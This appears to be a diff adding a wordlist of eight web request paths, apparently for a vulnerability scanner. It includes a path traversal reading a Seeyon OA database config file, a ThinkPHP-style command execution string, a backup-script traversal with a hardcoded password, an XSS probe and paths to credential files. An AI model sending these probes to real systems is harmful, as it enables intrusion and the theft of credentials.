@@ -1,0 +1,8 @@
+/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+/api/v1/GetSrc
+/api/v1/GetDevice
+/install/
+/s=set&_method=__construct&method=*&filter[]=system
+/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+/e/ViewImg/index.html?url=javascript:alert(1)
+/web/xml/webuser-auth.xml
